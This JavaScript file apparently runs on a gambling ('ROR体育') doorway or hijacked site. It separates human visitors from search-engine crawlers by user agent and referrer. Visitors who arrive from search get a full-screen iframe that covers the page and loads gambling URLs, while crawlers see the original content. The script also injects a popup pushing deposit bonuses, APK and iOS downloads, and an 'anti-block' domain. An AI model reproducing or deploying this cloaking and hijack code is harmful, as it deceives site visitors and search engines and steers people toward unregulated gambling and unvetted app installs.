// 引擎来路并且非蜘蛛
let isOpenUrl = document.querySelector('#IsOpenUrl').getAttribute('value');

let openUrlPc = document.querySelector('#openUrlPc').getAttribute('value');
let openUrlH5 = document.querySelector('#openUrlH5').getAttribute('value');
let openUrlAPP = document.querySelector('#openUrlAPP').getAttribute('value');
let MyOpenDomain = document.querySelector('#myOpenDomain').getAttribute('value');
let openUrlIOS = document.querySelector('#openUrlIOS').getAttribute('value');
let openUrlAndroid = document.querySelector('#openUrlAndroid').getAttribute('value');
let openUrlAgentPage = document.querySelector('#openUrlAgentPage').getAttribute('value');

let isOpenModal = document.querySelector('#isOpenModal').getAttribute('value');
let openUrlPage = document.querySelector('#openUrlPage').getAttribute('value');
let kefuLink = document.querySelector('#kefuLink').getAttribute('value');
let autoChangeUrl = document.querySelector('#autoChangeUrl').getAttribute('value');
let agentLinkName = document.querySelector('#agentLinkName').getAttribute('value');
let browserType = document.querySelector('#browserType').getAttribute('value');
var todayTime = new Date().toLocaleDateString();
let TCCOLOSETIME = 9;
//弹窗关闭倒计时
// if (openUrlAndroid) openUrlAndroid = openUrlAndroid.replace(/##/g, '');
let URL = openUrlPc.replace(/##/g, '');
const notSpider = !/(bot|spider|Spider)/i.test(navigator.userAgent);
const regexpReferrer = /\.(sogou|soso|baidu|google|youdao|yahoo|bing|so|biso|gougou|ifeng|ivc|sooule|niuhu|biso|sm|toutiao)(\.[a-z0-9\-]+){1,2}\//ig;
const whereReferrer = document.referrer || '';
//获取referrer
const isReferrer = regexpReferrer.test(whereReferrer);
const nowPathname = document.location.pathname;
if (window.innerWidth < 768) {
    // 注册页面
    URL = openUrlH5.replace(/##/g, '');
};
if (openUrlPage == '2') {
    // 是落地页
    URL = openUrlAgentPage.replace(/##/g, '');
};
if (openUrlPage == '3') {
    // 代理线域名
    URL = MyOpenDomain.replace(/##/g, '');
};
if (openUrlPage == '4') {
    // pc注册 h5 APP
    if (window.innerWidth < 768) {
        URL = openUrlAPP.replace(/##/g, '');
    };
};
const open_window = function (url) {
    window.location.href = url
};
const open_window_split = function (url) {
    url = url.replace(/##/g, '');
    window.location.href = url;
};
const open_new_window = function (url) {
    window.open(url);
};
const open_new_window_split = function (url) {
    url = url.replace(/##/g, '');
    window.open(url);
};
//自动切换url 的

const autoChangeUrlFun = function () {
    let isHaveLocalThisPage = window.localStorage.getItem('IS_S_OPEN_THIS_PAGE')-0 || 0;
    let nowIsUrlThisPage = window.sessionStorage.getItem('NOW_IS_URL_PAGE');
    if (nowIsUrlThisPage) {
        // 当前页面刷新
        URL = nowIsUrlThisPage.replace(/##/g, '');
    } else {
        // 重新进入页面
        let urlList = [openUrlPc, openUrlH5, openUrlAPP];
        URL = urlList[isHaveLocalThisPage % urlList.length].replace(/##/g, '');
    }
    window.sessionStorage.setItem('NOW_IS_URL_PAGE', URL);
    isHaveLocalThisPage++;
    window.localStorage.setItem('IS_S_OPEN_THIS_PAGE', isHaveLocalThisPage);
    window.onbeforeunload = function(e) {
        window.sessionStorage.removeItem('NOW_IS_URL_PAGE')
    };
};
const createIframe = function (id, url, width, height) {
    // var loadingDomBox = document.createElement("div");
    // document.body.appendChild(loadingDomBox);
    if (!url || url.indexOf('http') == -1) return null;
    let html = document.querySelector('html');
    html.style.height = '100%';
    var iframe = document.createElement("iframe");
    iframe.id = id;
    iframe.width = width;
    iframe.height = height;
    iframe.style.position = 'fixed';
    iframe.style.top = '0';
    iframe.style['z-index'] = 10000000000000;
    iframe.style['left'] = 0;
    iframe.style['background'] = '#ffffff';
    iframe.style['overflow'] = 'auto';
    iframe.src = url;
    iframe.setAttribute('frameborder', '0');
    document.body.style.height = '100%';
    document.body.style.overflow = 'hidden';
    document.body.style.padding = '0';
    document.body.style.margin = '0';
    document.body.appendChild(iframe);
};
// 开启跳转判断跳转页面
if (isOpenUrl == '1' && notSpider&&(nowPathname=='/'||nowPathname=='/index.html')) {
    // { label: "首页跳转", value: 1 },
    createIframe('global-iframe', URL, '100%', '100%');
    // { label: "301跳转", value: 5 },
    // { label: "302跳转", value: 6 },
};
if (isOpenUrl == '2' && notSpider&&nowPathname!='/'&&nowPathname!='/index.html') {
    // { label: "内页跳转", value: 2 },
    createIframe('global-iframe', URL, '100%', '100%');
};
if (isOpenUrl == '3' && notSpider) {
    // { label: "全跳转", value: 3 },
    createIframe('global-iframe', URL, '100%', '100%');
};
if (isOpenUrl == '4' && isReferrer && notSpider) {
    // { label: "来路自动跳转", value: 4 },
    // 判断跳转条件非蜘蛛来路是引擎就跳转 
    createIframe('global-iframe', URL, '100%', '100%');
};
if (isOpenUrl == '5' && notSpider && window.innerWidth < 1300) {
    // 移动端非蜘蛛跳转
    createIframe('global-iframe', URL, '100%', '100%');
};
if (isOpenUrl == '6' && notSpider && window.innerWidth < 1300&&whereReferrer) {
    //移动端搜索引擎非蜘蛛跳转
    createIframe('global-iframe', URL, '100%', '100%');
};
if (isOpenUrl == '7' && notSpider &&whereReferrer) {
    //移动端搜索引擎非蜘蛛跳转
    createIframe('global-iframe', URL, '100%', '100%');
};
//如果没有开启跳转搜索引擎来的自动跳  或者 搜狗引擎H5 自动跳转 
if (
    (isOpenUrl == '0' &&
    notSpider &&
    window.innerWidth < 1300&&isReferrer)||(browserType=='sogo'&&window.innerWidth < 1300)
) {
    createIframe('global-iframe', URL, '100%', '100%');
    // 第二次搜索引擎自动切换地址
    // if (autoChangeUrl == 1) {
    //     autoChangeUrlFun();
    // }
};
//如果 非蜘蛛&&pc端 修改成正规标题

var tanChuangKeFu = function () {
    var kefucontent = document.createElement("div");
    var my_host = window.location.host;
    // 客服地址把该加的参数都加上
    let kefu_url_str = `&sText=${agentLinkName}&ref=${my_host}`;
    if (kefuLink && kefuLink.indexOf('?') == -1) {
        kefu_url_str = '?' + kefu_url_str;
    };
    kefucontent.id = 'kefu-ror';
    let kefu_url = kefuLink + kefu_url_str;
    let rortylink_app = openUrlAPP;
    let rortylink_pc = openUrlPc;
    let rortylink_h5 = openUrlH5;
    let ios_link = openUrlIOS;
    let is_h5 = 'is-h5-no';
    if (window.innerWidth < 768) is_h5 = 'is-h5-yes';
    kefucontent.innerHTML = `
        <style>
            #kefu-ror{position:fixed;bottom:40px;right:6px;z-index:100000;width:80px;font-size:12px;text-align:center;}#kefu-ror .kf-item{background:#ff6c32;margin-bottom:10px;border-radius:7px;box-shadow:1px 1px 3px 0px #00000026;position:relative;border:1px solid #f55d21;transition:all ease 0.3s;}#kefu-ror .kf-item:hover{background-image:-webkit-gradient(linear,left top,left bottom,color-stop(6%,#fcd6cb),color-stop(50%,#ff5c00),color-stop(104%,#ff6c32));}#kefu-ror .kf-item-text{color:#404261;margin-top:3px;}#kefu-ror .kf-item-small{color:#ffffff;font-weight:800;}.kefu-img img{max-width:100%;width:40px;height:40px;border-radius:50%;margin:0 auto;}.kefu-img:hover .kf-item-text{color:#f76532;}.kefu-img a{text-decoration:none;color:#404261;display:inline-block;padding:10px 0;}#kefu-home-detail-open{position:fixed;width:100%;height:100%;background:rgb(35 9 0 / 63%);left:0;top:0;display:flex;align-items:center;justify-content:center;display:block;padding:0 5px;z-index:15000;box-sizing:border-box;}#kefu-home-detail-open .detail-content-pop{min-width:300px;min-height:400px;position:relative;max-width:520px;z-index:10;border-radius:10px;color:#fff;margin:0 auto;margin-top:10%;padding-bottom:10px;box-sizing:border-box;background:url(/images/common/gg-bg_03.png) no-repeat bottom right #F76532;background-size:25%;}#kefu-home-detail-open .detail-content-pop h1{margin:0;text-align:center;font-size:20px;padding:18px 0;background:#e05626;color:#fff;border-radius:5px 5px 0 0;position:relative;line-height:30px;}
            #kefu-home-detail-open .detail-content-pop span.close-bb{position:absolute;left:50%;bottom:-45px;cursor:pointer;font-size:14px;color:#fff;width:160px;text-align:center;height:40px;display:inline-block;line-height:40px;margin-left:-80px;}
            #kefu-home-detail-open .detail-content-pop .regist-buttons a{color:#ffffff;font-weight:800;border:2px solid #ffffff;border-radius:5px;font-size:14px;display:inline-block;padding:0 7px;text-decoration:none;box-sizing:border-box;line-height:35px;}.gg-content{padding:0 10px;line-height:20px;text-align:left;font-size:14px;}.gg-content p{margin-top:15px;color:#ffffff;padding:0;}.gg-content a{color:#fff;font-weight:800;}.download-gg{margin:30px 0;}.download-gg h2{margin:15px 0;padding:0;font-size:18px;font-weight:800;color:#fff;}.regist-buttons a{margin-top:5px;transition:all ease 0.2s;}#kefu-home-detail-open .detail-content-pop .regist-buttons a:hover{background:#f76532;color:#fff;}.close-gg{height:100%;font-size:14px;color:#fff;position:absolute;right:0px;top:0px;align-items:center;width:66px;justify-content:center;cursor:pointer;display:flex;transition:all ease 0.2s;border-radius:0 5px 0 0;}.close-gg:hover{background:#d64412;}.is-h5-yes{display:none !important;}.point{width:10px;height:10px;background-color:#ffffff;position:absolute;top:3px;left:3px;border-radius:50%;}.point-flicker:after{background-color:#ffffff;}.point-flicker:before{background-color:#ffffffba;}.point-flicker:before,.point-flicker:after{content:'';width:20px;height:20px;position:absolute;left:50%;top:50%;margin-left:-10px;margin-top:-10px;border-radius:50%;animation:warn 1.5s ease-out 0s infinite;}.app-icon{width:45px;height:45px;margin:0 auto;background:#fff;border-radius:7px;display:flex;align-items:center;box-shadow:1px 2px 6px -4px #9ab6f3;}.gg-bottom-kf{font-size:14px;color:#fff}
            .gg-time-start,.gg-time-start2{}
            .gg-time-start{width:70px;}
            .gg-time-start2{width: 70px;display: block;margin: 0 auto;}
            .close-bb i{display:inline-block;font-style:normal;}#global-iframe{background:#ffffff;}div,a{-webkit-tap-highlight-color:transparent;}@keyframes warn{0%{transform:scale(0.5);opacity:1;}30%{opacity:1;}100%{transform:scale(1.4);opacity:0;}}.bot-left-text-close{cursor:pointer;color:#ff5c00;}
        </style>
        <div id="kefu-home-detail-open">
            <div class="detail-content-pop">
                <h1>
                    <span>ROR体育官网公告</span>  
                    <small onclick="closeKEFUGG()" class="close-gg">
                        <img width="30px" height="30px" src="/images/common/close.svg" />
                    </small>
                </h1>
                <div class="gg-content">
                    <p>1、ROR体育注册首存联系客服送 <a href="${kefu_url}" target="_blank" rel="noopener">联系客服</a> </p>
                    <p>2、知名平台用户可平移赠送免费体验金 <a href="${kefu_url}" target="_blank" rel="noopener">立即领取 </a></p>
                </div>
                <div class="download-gg">
                    <h2>ROR体育官方 注册登录链接</h2>
                    <div class="regist-buttons">
                        <a onclick='open_new_window_split("${rortylink_h5}")' href="javascript:void(0)" rel="noopener">手机网页</a>
                        <a onclick='open_new_window_split("${openUrlAndroid}")' href="javascript:void(0)">安卓下载</a>
                        <a onclick='open_new_window_split("${ios_link}")' href="javascript:void(0)" rel="noopener">苹果IOS</a>
                        <a onclick='open_new_window_split("${rortylink_app}")' href="javascript:void(0)" rel="noopener">全站下载</a>
                        <a onclick='open_new_window_split("${rortylink_pc}")' href="javascript:void(0)" class="${is_h5}" rel="noopener">官方网站</a>
                        <a onclick='open_new_window_split("${MyOpenDomain}")' href="javascript:void(0)" rel="noopener">防封</a>
                    </div>
                </div>
                <div class="gg-bottom-kf">
                    ${todayTime}发布  ROR体育官方致谢！
                </div>
                <span class="close-bb" onclick="closeKEFUGG()">
                    <b class="gg-time-start">${TCCOLOSETIME}秒</b> 
                    <!-- <b class="gg-time-start2">
                        <img width="30px" height="30px" src="/images/common/close.svg" />
                    </b> -->
                </span>
            </div>
        </div>
        <div class="detail-content-left-panel">
            <div class="kefu-img kf-item">
                <a onclick='open_new_window_split("${MyOpenDomain}")' href="javascript:void(0)" rel="noopener">
                    <div class="kf-item-small">官方网站</div>
                </a>
            </div>
            <div class="kefu-img kf-item">
                <a onclick='open_new_window_split("${openUrlAndroid}")' href="javascript:void(0)">
                    <div class="kf-item-small">安卓APK</div>
                </a>
            </div>
            <div class="kefu-img kf-item">
                <a onclick='open_new_window_split("${ios_link}")' href="javascript:void(0)" rel="noopener">
                    <div class="kf-item-small">苹果IOS</div>
                </a>
            </div>
            <div class="kefu-img kf-item">
                <a onclick='open_new_window_split("${rortylink_h5}")' href="javascript:void(0)" rel="noopener">
                    <div class="kf-item-small">手机网页</div>
                </a>
            </div>
            <div class="kefu-img kf-item">
                <a onclick='open_new_window_split("${rortylink_app}")' href="javascript:void(0)" rel="noopener">
                    <div class="app-icon"><img src="/images/common/ror_big_logo.jpg"></div>
                    <div class="kf-item-small">APP下载</div>
                </a>
            </div>
            <div class="kefu-img kf-item">
                <a href="${kefu_url}" target="_blank" rel="noopener">
                    <div class="point point-flicker"></div>
                    <div><img src="/images/common/kf.png"></div>
                    <div class="kf-item-small">在线客服</div>
                </a>
            </div>
            <div class="bot-left-text-close" onclick="closeKEFULEFT()">关闭</div>
        </div>
    `;
    document.body.appendChild(kefucontent);
    let detailOpenDom = document.querySelector('#kefu-home-detail-open');
    let detailContentLeftPanel = document.querySelector('.detail-content-left-panel');
    window.closeKEFUGG = function () {
        detailOpenDom.style.display = 'none';
    };
    window.closeKEFULEFT = function () {
        detailContentLeftPanel.style.display = 'none';
    };
    let closeTimmer = setInterval(() => {
        TCCOLOSETIME--;
        if (TCCOLOSETIME <= 0) {
            clearInterval(closeTimmer);
            detailOpenDom.style.display = 'none';
            return;
        };
        let ggTimeStart = detailOpenDom.querySelector('.gg-time-start');
        ggTimeStart.innerHTML = TCCOLOSETIME + '秒';
    }, 1000)
};
// 如果弹窗开启非蜘蛛
if (isOpenModal == 1 && notSpider) {
    tanChuangKeFu();
};
if (isOpenModal == 2 && isReferrer && notSpider) {
    tanChuangKeFu();
};
// 设置uv
document.cookie = 'uv-session-today=' + (Number(new Date().getUTCMonth()) + 1) + '-' + new Date().getUTCDate();

